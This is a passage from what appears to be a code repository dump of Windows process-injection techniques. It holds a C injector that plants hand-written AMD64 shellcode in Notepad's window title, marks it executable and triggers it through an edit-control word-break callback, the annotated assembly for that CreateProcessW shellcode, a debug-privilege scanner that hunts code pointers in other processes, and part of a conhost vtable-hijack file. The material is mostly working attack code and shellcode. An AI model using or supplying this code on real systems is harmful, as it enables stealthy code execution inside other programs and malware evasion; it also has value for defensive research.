  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#include "../ntlib/util.h"

// get the address of window title
PVOID get_win_text(HANDLE hp, PDWORD textlen) {
    NTSTATUS                    nts;
    PROCESS_BASIC_INFORMATION   pbi;
    RTL_USER_PROCESS_PARAMETERS upp;
    PEB                         peb;
    ULONG                       len;
    SIZE_T                      rd;

    // get the address of PEB
    nts = NtQueryInformationProcess(
        hp, ProcessBasicInformation,
        &pbi, sizeof(pbi), &len);
    
    // get the address RTL_USER_PROCESS_PARAMETERS
    ReadProcessMemory(
      hp, pbi.PebBaseAddress,
      &peb, sizeof(PEB), &rd);
    
    // get the address of window title
    ReadProcessMemory(
      hp, peb.ProcessParameters,
      &upp, sizeof(RTL_USER_PROCESS_PARAMETERS), &rd);

    *textlen = upp.WindowTitle.Length;
    return upp.WindowTitle.Buffer;
}

#define WINEXEC_SIZE 197

char WINEXEC[] = {
  /* 0000 */ "\x56"                     /* push      rsi                           */
  /* 0001 */ "\x53"                     /* push      rbx                           */
  /* 0002 */ "\x57"                     /* push      rdi                           */
  /* 0003 */ "\x55"                     /* push      rbp                           */
  /* 0004 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0006 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 0008 */ "\x48\x29\xc4"             /* sub       rsp, rax                      */
  /* 000B */ "\x51"                     /* push      rcx                           */
  /* 000C */ "\x6a\x60"                 /* push      0x60                          */
  /* 000E */ "\x41\x5b"                 /* pop       r11                           */
  /* 0010 */ "\x65\x49\x8b\x03"         /* mov       rax, qword gs:[r11]           */
  /* 0014 */ "\x48\x8b\x40\x18"         /* mov       rax, qword [rax + 0x18]       */
  /* 0018 */ "\x48\x8b\x78\x10"         /* mov       rdi, qword [rax + 0x10]       */
  /* 001C */ "\xeb\x03"                 /* jmp       0x21                          */
  /* 001E */ "\x48\x8b\x3f"             /* mov       rdi, qword [rdi]              */
  /* 0021 */ "\x48\x8b\x5f\x30"         /* mov       rbx, qword [rdi + 0x30]       */
  /* 0025 */ "\x8b\x73\x3c"             /* mov       esi, dword [rbx + 0x3c]       */
  /* 0028 */ "\x44\x01\xde"             /* add       esi, r11d                     */
  /* 002B */ "\x8b\x4c\x33\x28"         /* mov       ecx, dword [rbx + rsi + 0x28] */
  /* 002F */ "\x67\xe3\xec"             /* jecxz     0x1e                          */
  /* 0032 */ "\x48\x8d\x74\x0b\x18"     /* lea       rsi, qword [rbx + rcx + 0x18] */
  /* 0037 */ "\xad"                     /* lodsd                                   */
  /* 0038 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 0039 */ "\x67\xe3\xe2"             /* jecxz     0x1e                          */
  /* 003C */ "\xad"                     /* lodsd                                   */
  /* 003D */ "\x41\x90"                 /* xchg      eax, r8d                      */
  /* 003F */ "\x49\x01\xd8"             /* add       r8, rbx                       */
  /* 0042 */ "\xad"                     /* lodsd                                   */
  /* 0043 */ "\x95"                     /* xchg      eax, ebp                      */
  /* 0044 */ "\x48\x01\xdd"             /* add       rbp, rbx                      */
  /* 0047 */ "\xad"                     /* lodsd                                   */
  /* 0048 */ "\x41\x91"                 /* xchg      eax, r9d                      */
  /* 004A */ "\x49\x01\xd9"             /* add       r9, rbx                       */
  /* 004D */ "\x8b\x74\x8d\xfc"         /* mov       esi, dword [rbp + rcx*4 - 4]  */
  /* 0051 */ "\x48\x01\xde"             /* add       rsi, rbx                      */
  /* 0054 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0056 */ "\x99"                     /* cdq                                     */
  /* 0057 */ "\xac"                     /* lodsb                                   */
  /* 0058 */ "\x01\xc2"                 /* add       edx, eax                      */
  /* 005A */ "\xc1\xca\x08"             /* ror       edx, 8                        */
  /* 005D */ "\xfe\xc8"                 /* dec       al                            */
  /* 005F */ "\x79\xf6"                 /* jns       0x57                          */
  /* 0061 */ "\x81\xfa\x47\x9a\x92\x1b" /* cmp       edx, 0x1b929a47               */
  /* 0067 */ "\xe0\xe4"                 /* loopne    0x4d                          */
  /* 0069 */ "\x75\xb3"                 /* jne       0x1e                          */
  /* 006B */ "\x41\x0f\xb7\x04\x49"     /* movzx     eax, word [r9 + rcx*2]        */
  /* 0070 */ "\x41\x8b\x04\x80"         /* mov       eax, dword [r8 + rax*4]       */
  /* 0074 */ "\x48\x01\xc3"             /* add       rbx, rax                      */
  /* 0077 */ "\x5a"                     /* pop       rdx                           */
  /* 0078 */ "\x4d\x31\xc0"             /* xor       r8, r8                        */
  /* 007B */ "\x4d\x31\xc9"             /* xor       r9, r9                        */
  /* 007E */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 0080 */ "\x48\x89\x44\x24\x20"     /* mov       qword [rsp + 0x20], rax       */
  /* 0085 */ "\x48\x89\x44\x24\x28"     /* mov       qword [rsp + 0x28], rax       */
  /* 008A */ "\x48\x89\x44\x24\x30"     /* mov       qword [rsp + 0x30], rax       */
  /* 008F */ "\x48\x89\x44\x24\x38"     /* mov       qword [rsp + 0x38], rax       */
  /* 0094 */ "\x48\x8d\x7c\x24\x50"     /* lea       rdi, qword [rsp + 0x50]       */
  /* 0099 */ "\x48\x89\x7c\x24\x48"     /* mov       qword [rsp + 0x48], rdi       */
  /* 009E */ "\x48\x8d\x7c\x24\x60"     /* lea       rdi, qword [rsp + 0x60]       */
  /* 00A3 */ "\x48\x89\x7c\x24\x40"     /* mov       qword [rsp + 0x40], rdi       */
  /* 00A8 */ "\x31\xc9"                 /* xor       ecx, ecx                      */
  /* 00AA */ "\x6a\x68"                 /* push      0x68                          */
  /* 00AC */ "\x58"                     /* pop       rax                           */
  /* 00AD */ "\xab"                     /* stosd                                   */
  /* 00AE */ "\x48\x83\xe8\x04"         /* sub       rax, 4                        */
  /* 00B2 */ "\x91"                     /* xchg      eax, ecx                      */
  /* 00B3 */ "\xf3\xaa"                 /* rep       stosb                         */
  /* 00B5 */ "\xff\xd3"                 /* call      rbx                           */
  /* 00B7 */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00B9 */ "\xb0\xc8"                 /* mov       al, 0xc8                      */
  /* 00BB */ "\x48\x01\xc4"             /* add       rsp, rax                      */
  /* 00BE */ "\x31\xc0"                 /* xor       eax, eax                      */
  /* 00C0 */ "\x5d"                     /* pop       rbp                           */
  /* 00C1 */ "\x5f"                     /* pop       rdi                           */
  /* 00C2 */ "\x5b"                     /* pop       rbx                           */
  /* 00C3 */ "\x5e"                     /* pop       rsi                           */
  /* 00C4 */ "\xc3"                     /* ret                                     */
};

#define NOTEPAD_PATH L"%SystemRoot%\\system32\\notepad.exe"

void win_text_inject(PWCHAR cmd) {
    STARTUPINFO         si;
    PROCESS_INFORMATION pi;
    WCHAR               path[MAX_PATH]={0};    
    INT                 i; 
    PVOID               va;
    DWORD               rva, old, len;
    PVOID               win_title;
    HWND                npw, ecw;

    ExpandEnvironmentStrings(NOTEPAD_PATH, path, MAX_PATH);
    
    // create a new process using shellcode as window title
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWDEFAULT;
    si.lpTitle     = (PWCHAR)WINEXEC;
    
    if(!CreateProcess(path, NULL, NULL, NULL, 
      FALSE, 0, NULL, NULL, &si, &pi))
    {
      xstrerror(L"CreateProcess");
      goto cleanup;
    }
     
    // wait for process to initialize
    // if you don't wait, there can be a race condition
    // reading the correct window title address from new process  
    WaitForInputIdle(pi.hProcess, INFINITE);
    
    // the command to execute is just pasted into the notepad
    // edit control.
    npw = FindWindow(L"Notepad", NULL);
    ecw = FindWindowEx(npw, NULL, L"Edit", NULL);
    SendMessage(ecw, WM_SETTEXT, 0, (LPARAM)cmd);
    
    // get the address of window title in new process
    // which contains our shellcode
    win_title = get_win_text(pi.hProcess, &len);
    
    // set the window title address to RWX
    if(!VirtualProtectEx(pi.hProcess, win_title, 
      len, PAGE_EXECUTE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RWX)");
      goto cleanup;
    }
    
    // execute shellcode
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)win_title);
    SendMessage(ecw, WM_LBUTTONDBLCLK, MK_LBUTTON, (LPARAM)0x000a000a);
    SendMessage(ecw, EM_SETWORDBREAKPROC, 0, (LPARAM)NULL);
    
    // set window title address to RW
    if(!VirtualProtectEx(pi.hProcess, win_title, 
      len, PAGE_READWRITE, &old)) {
      xstrerror(L"VirtualProtectEx(RW)");
    }
cleanup:

    if(pi.hProcess != NULL) {
      //TerminateProcess(pi.hProcess, 0);
      CloseHandle(pi.hThread);
      CloseHandle(pi.hProcess);
    }
}

int main(void) {
    WCHAR **argv;
    int   argc;
    
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    if(argc != 2) {
      printf("usage: win_inject <command>\n");
      return 0;
    }
    
    win_text_inject(argv[1]);
    
    return 0;
}

```

`cmdline/winexec1.asm`:

```asm
;
;  Copyright © 2020 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; invoke CreateProcessW() in 197 bytes of AMD64 assembly
; The wide-character string in RCX is passed as lpCommandLine
;
; Odzhan
;
      bits 64
      
      %include "include.inc"
      
      struc stk_mem
        .hs                   resb home_space_size
        
        .bInheritHandles      resq 1
        .dwCreationFlags      resq 1
        .lpEnvironment        resq 1
        .lpCurrentDirectory   resq 1
        .lpStartupInfo        resq 1
        .lpProcessInformation resq 1
        
        .procinfo             resb PROCESS_INFORMATION_size
        .startupinfo          resb STARTUPINFO_size
      endstruc

      %define stk_size ((stk_mem_size + 15) & -16) - 8
      
      %ifndef BIN
        global createproc
      %endif
      
      ; void createproc(WCHAR cmd[]);
createproc:
      ; save non-volatile registers
      pushx  rsi, rbx, rdi, rbp
      
      ; allocate stack memory for arguments + home space
      xor    eax, eax
      mov    al, stk_size
      sub    rsp, rax
      
      ; save pointer to buffer
      push   rcx
      
      push   TEB.ProcessEnvironmentBlock
      pop    r11
      mov    rax, [gs:r11]
      mov    rax, [rax+PEB.Ldr]
      mov    rdi, [rax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]
      jmp    scan_dll
next_dll:    
      mov    rdi, [rdi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink]
scan_dll:
      mov    rbx, [rdi+LDR_DATA_TABLE_ENTRY.DllBase]

      mov    esi, [rbx+IMAGE_DOS_HEADER.e_lfanew]
      add    esi, r11d             ; add 60h or TEB.ProcessEnvironmentBlock
      ; ecx = IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
      mov    ecx, [rbx+rsi+IMAGE_NT_HEADERS.OptionalHeader + \
                           IMAGE_OPTIONAL_HEADER.DataDirectory + \
                           IMAGE_DIRECTORY_ENTRY_EXPORT * IMAGE_DATA_DIRECTORY_size + \
                           IMAGE_DATA_DIRECTORY.VirtualAddress - \
                           TEB.ProcessEnvironmentBlock]
      jecxz  next_dll              ; if no exports, try next DLL in list
      ; rsi = offset IMAGE_EXPORT_DIRECTORY.Name 
      lea    rsi, [rbx+rcx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
      lodsd                        ; eax = NumberOfNames
      xchg   eax, ecx
      jecxz  next_dll              ; if no names, try next DLL in list
      
      ; r8 = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
      lodsd
      xchg   eax, r8d              ;
      add    r8, rbx               ; r8 = RVA2VA(r8, rbx)
      ; ebp = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      xchg   eax, ebp              ;
      add    rbp, rbx              ; rbp = RVA2VA(rbp, rbx)
      ; r9 = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals      
      lodsd
      xchg   eax, r9d
      add    r9, rbx               ; r9 = RVA2VA(r9, rbx)
find_api:
      mov    esi, [rbp+rcx*4-4]    ; rax = AddressOfNames[rcx-1]
      add    rsi, rbx
      xor    eax, eax
      cdq
hash_api:
      lodsb
      add    edx, eax
      ror    edx, 8
      dec    al
      jns    hash_api
      cmp    edx, 0x1b929a47       ; CreateProcessW
      loopne find_api              ; loop until found or no names left
      
      jnz    next_dll              ; not found? goto next_dll
      
      movzx  eax, word[r9+rcx*2]   ; eax = AddressOfNameOrdinals[rcx]
      mov    eax, [r8+rax*4]
      add    rbx, rax              ; rbx += AddressOfFunctions[rdx]
      
      ; CreateProcess(NULL, cmd, NULL, NULL, 
      ;   FALSE, 0, NULL, &si, &pi);
      pop    rdx           ; lpCommandLine = buffer for Edit
      xor    r8, r8        ; lpProcessAttributes = NULL
      xor    r9, r9        ; lpThreadAttributes = NULL
      xor    eax, eax
      mov    [rsp+stk_mem.bInheritHandles     ], rax ; bInheritHandles      = FALSE
      mov    [rsp+stk_mem.dwCreationFlags     ], rax ; dwCreationFlags      = 0
      mov    [rsp+stk_mem.lpEnvironment       ], rax ; lpEnvironment        = NULL
      mov    [rsp+stk_mem.lpCurrentDirectory  ], rax ; lpCurrentDirectory   = NULL
      
      lea    rdi, [rsp+stk_mem.procinfo       ]
      mov    [rsp+stk_mem.lpProcessInformation], rdi ; lpProcessInformation = &pi

      lea    rdi, [rsp+stk_mem.startupinfo    ]
      mov    [rsp+stk_mem.lpStartupInfo       ], rdi ; lpStartupInfo        = &si
      
      xor    ecx, ecx
      push   STARTUPINFO_size
      pop    rax
      stosd                         ; si.cb = sizeof(STARTUPINFO)
      sub    rax, 4
      xchg   eax, ecx
      rep    stosb
      call   rbx
      
      ; deallocate stack
      xor    eax, eax
      mov    al, stk_size
      add    rsp, rax
      xor    eax, eax
      
      ; restore non-volatile registers
      popx   rsi, rbx, rdi, rbp  
      ret
      
```

`codeptr/enum.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <versionhelpers.h>

#include "../ntlib/util.h"

// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// does pointer reside on the stack or heap?
BOOL IsHeapPtrEx(HANDLE hp, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQueryEx(hp, ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_PRIVATE   ) && 
            (mbi.Protect == PAGE_READWRITE));
}

// does pointer reside in the .data section?
BOOL IsDataPtrEx(HANDLE hp, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQueryEx(hp, ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_READWRITE));
}

#include "mpr.h"
#include "npapi.h"
#include "mprdata.h"

BOOL ValidateMPR(HANDLE hp, LPVOID cs) {
    PROVIDER prov;
    SIZE_T   rd;
    
    // read provider
    if(!ReadProcessMemory(hp, cs, &prov, 
      sizeof(prov), &rd)) return FALSE;
    
    // valid scope?
    switch(prov.Resource.dwScope) {
      case RESOURCE_CONNECTED :
      case RESOURCE_GLOBALNET :
      case RESOURCE_CONTEXT   :
        break;
      default:
        return FALSE;
    }
    
    /// valid type?
    switch(prov.Resource.dwType) {
      case RESOURCETYPE_DISK  :
      case RESOURCETYPE_PRINT :
      case RESOURCETYPE_ANY   :
        break;
      default:
        return FALSE;
    }    

    // valid display type?
    switch(prov.Resource.dwDisplayType) {
      case RESOURCEDISPLAYTYPE_NETWORK   :
      case RESOURCEDISPLAYTYPE_DOMAIN    :
      case RESOURCEDISPLAYTYPE_SERVER    :
      case RESOURCEDISPLAYTYPE_SHARE     :
      case RESOURCEDISPLAYTYPE_DIRECTORY :
      case RESOURCEDISPLAYTYPE_GENERIC   :
        break;
      default:
        return FALSE;
    }
    
    // if not empty, make sure it's the heap
    if(prov.Resource.lpLocalName != NULL) {
      if(!IsHeapPtrEx(hp, prov.Resource.lpLocalName)) 
        return FALSE;
    }
    
    if(prov.Resource.lpRemoteName != NULL) {
      if(!IsHeapPtrEx(hp, prov.Resource.lpRemoteName)) 
        return FALSE;
    }
    
    if(prov.Resource.lpComment != NULL) {
      if(!IsHeapPtrEx(hp, prov.Resource.lpComment)) 
        return FALSE;
    }
    
    if(prov.Resource.lpProvider != NULL) {
      if(!IsHeapPtrEx(hp, prov.Resource.lpProvider)) 
        return FALSE;
    }
    
    // ensure at least one function points to code
    if(!IsCodePtrEx(hp, prov.AddConnection)) 
      return FALSE;
    
    return TRUE;
}

#define UNICODE
#define SECURITY_WIN32

#include <schannel.h>
#include <security.h>
#include <sspi.h>

DWORD ListCodePtr(HANDLE hp, PWCHAR dll, PLDR_DATA_TABLE_ENTRY dte) {
    WCHAR                 path[MAX_PATH];
    SIZE_T                rd;
    LPVOID                cs, m;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, ptrs=0, cnt, rva=0;
    PULONG_PTR            ds, ptr;
    BOOL                  bRead;
    SecurityFunctionTableW sspi;
    NTSTATUS               nts;
    HANDLE                 obj;
    BYTE                       buf[1024];
    POBJECT_NAME_INFORMATION   name = (POBJECT_NAME_INFORMATION)buf;
    
    if(ReadProcessMemory(hp, dte->FullDllName.Buffer, path, MAX_PATH, &rd)) {
      // if DLL specified and this doesn't match ours, return
      if(dll != NULL && StrStrI(path, dll) == NULL) return 0;
      
      m = GetModuleHandle(path);
      if(m == NULL) {
        m = LoadLibrary(path);
        if(m == NULL) {
          printf("Unable to load %ws\n", path);
          return 0;
        }
      }
      dos = (PIMAGE_DOS_HEADER)m;  
      nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
      sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
      // locate the .data segment, save va and number of pointers
      for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
          ds  = RVA2VA(PULONG_PTR, dte->DllBase, sh[i].VirtualAddress);
          cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
          break;
        }
      }
      
      // for each pointer
      for(ptrs=i=0; i<cnt; i++) {
        // read a pointer
        //printf("Reading %p\n", &ds[i]);
        bRead = ReadProcessMemory(hp, &ds[i], &cs, sizeof(ULONG_PTR), &rd);
        if(!bRead) break;
        if(cs == NULL || ((ULONG64)cs % 4)) continue;
        
        nts = NtDuplicateObject(
            hp, (HANDLE)cs, 
            GetCurrentProcess(), &obj, 0, FALSE, 
            DUPLICATE_SAME_ACCESS);
            
        if(NT_SUCCESS(nts)) {
          // query the name
          NtQueryObject(
            obj, ObjectNameInformation, 
            name, MAX_PATH, NULL);
            
          // if name returned.. 
          if(name->Name.Length != 0) {
            // is it knowndlls directory?
            printf("%lx : %ws\n", cs, name->Name.Buffer);
          }
        
          NtClose(obj);
        }
        /** code pointer?
        if(IsHeapPtrEx(hp, cs)) {
          ptrs++;
         // printf("Reading SSPI structure from %p.\n", cs);
          ReadProcessMemory(hp, cs, &sspi, sizeof(sspi), &rd);
          //printf("Checking %p\n", sspi.EnumerateSecurityPackagesW);
          if(IsCodePtrEx(hp, sspi.EnumerateSecurityPackagesW)  &&
             IsCodePtrEx(hp, sspi.QueryCredentialsAttributesW) &&
             IsCodePtrEx(hp, sspi.AcquireCredentialsHandleW))
          {
         // if(ValidateMPR(hp, cs)) {
            printf("%ws\n", path);
            printf("    %p => ", &ds[i]);
            printf("%p : %ws\n", cs, addr2sym(hp, cs));
         // }
          }
        }*/
      }
    }
    return ptrs;
}

VOID EnumCodePtr(PPROCESSENTRY32 pe32, PWCHAR dll) {
    HANDLE                    hp;
    DWORD                     i, total;
    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS                  status;
    PEB                       peb;
    SIZE_T                    rd;
    PEB_LDR_DATA              ldr;
    PLIST_ENTRY               head, curr;
    LDR_DATA_TABLE_ENTRY      dte;
    BOOL                      bRead;
    WCHAR                     path[MAX_PATH];
    
    // try open the process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32->th32ProcessID);
    
    if(hp == NULL) {
      printf("Unable to open %ws:%lu\n", pe32->szExeFile, GetLastError());
      return;
    }
    
    printf("**********************************************************\n");
    printf("Checking %ws : %lu\n", pe32->szExeFile, pe32->th32ProcessID);
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    SymInitialize(hp, NULL, TRUE);
    
    status = NtQueryInformationProcess(hp, 
      ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
      
    if(NT_SUCCESS(status)) {
      // try reading the PEB into local memory
      if(ReadProcessMemory(hp, pbi.PebBaseAddress, &peb, sizeof(peb), &rd)) {
        // try reading the PEB_LDR_DATA into local memory
        if(ReadProcessMemory(hp, peb.Ldr, &ldr, sizeof(ldr), &rd)) {
          // for each DLL
          head = (PLIST_ENTRY)ldr.InLoadOrderModuleList.Flink;
          curr = (PLIST_ENTRY)ldr.InLoadOrderModuleList.Flink;
          
          for(total=0;;) {
            bRead = ReadProcessMemory(hp, curr, &dte, sizeof(dte), &rd);
            if(!bRead || rd != sizeof(dte)) break;
            
            total += ListCodePtr(hp, dll, &dte);
            
            curr = dte.InLoadOrderLinks.Flink;
            if(curr == head) break;
          }
        }
      }
    }
    if(total != 0) {
      printf("\nFound %i code pointers.\n", total);
    }
    SymCleanup(hp);
    CloseHandle(hp);
}

VOID ScanProcess(DWORD pid, PWCHAR dll) {
    HANDLE         hs;
    PROCESSENTRY32 pe32;
   
    hs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hs == INVALID_HANDLE_VALUE) return;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(hs, &pe32)){
      do {
        // if filtering by pid, skip if not our pid
        if(pid != 0 && pe32.th32ProcessID != pid) continue;
        // if not filtering by pid, don't list pointers in ourselves
        if(pe32.th32ProcessID == GetCurrentProcessId()) continue;
        
        EnumCodePtr(&pe32, dll);
      } while(Process32Next(hs, &pe32));
    }
    CloseHandle(hs);
}

void SSPIGetRVA(void) {
    HMODULE m = LoadLibrary(L"sspicli");
    
    
}

#include <knownfolders.h>
#include <shlobj.h>
#include <shlwapi.h>

int main(void) {
    DWORD   i, j, len, cnt, pid = 0;
    LPVOID  payload;
    int     argc;
    wchar_t **argv, *process = NULL, *dll = NULL;

    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      printf("WARNING: could not enable debugging privilege.\n");
    }
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    for(i=1; i<argc; i++) {
      if(argv[i][0]=='/' || argv[i][0]=='-') {
        switch(argv[i][1]) {
          case L'm':
            dll = argv[++i];
            break;
          default:
            printf("unknown switch : %c\n", argv[i][1]);
            break;
        }
      } else {
        process = argv[i];
      }
    }

    if(process != NULL) {
      pid = name2pid(process);
      if(pid == 0) pid = wcstoull(process, NULL, 10);
      if(pid == 0) {
        printf("ERROR: unable to resolve pid for \"%ws\".\n", process);
        return -1;
      }
    }
    printf("Checking %ws for %ws.\n",
      pid != 0    ? pid2name(pid) : L"all processes",
      dll != NULL ? dll           : L"all DLL");
      
    ScanProcess(pid, dll);
    return 0;
}

```

`conhost/Makefile`:

```
conhost:
	cl /nologo /MD chost.c
clean:
	del chost.exe *.obj
```

`conhost/chost.c`:

```c

/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define UNICODE
  
#include <windows.h>
#include <tlhelp32.h>

#include <stdio.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

typedef struct _vftable_t {
    ULONG_PTR     EnableBothScrollBars;
    ULONG_PTR     UpdateScrollBar;
    ULONG_PTR     IsInFullscreen;
    ULONG_PTR     SetIsFullscreen;
    ULONG_PTR     SetViewportOrigin;
    ULONG_PTR     SetWindowHasMoved;
    ULONG_PTR     CaptureMouse;
    ULONG_PTR     ReleaseMouse;
    ULONG_PTR     GetWindowHandle;
    ULONG_PTR     SetOwner;
    ULONG_PTR     GetCursorPosition;
    ULONG_PTR     GetClientRectangle;
    ULONG_PTR     MapPoints;
    ULONG_PTR     ConvertScreenToClient;
    ULONG_PTR     SendNotifyBeep;
    ULONG_PTR     PostUpdateScrollBars;
    ULONG_PTR     PostUpdateTitleWithCopy;
    ULONG_PTR     PostUpdateWindowSize;
    ULONG_PTR     UpdateWindowSize;
    ULONG_PTR     UpdateWindowText;
    ULONG_PTR     HorizontalScroll;
    ULONG_PTR     VerticalScroll;
    ULONG_PTR     SignalUia;
    ULONG_PTR     UiaSetTextAreaFocus;
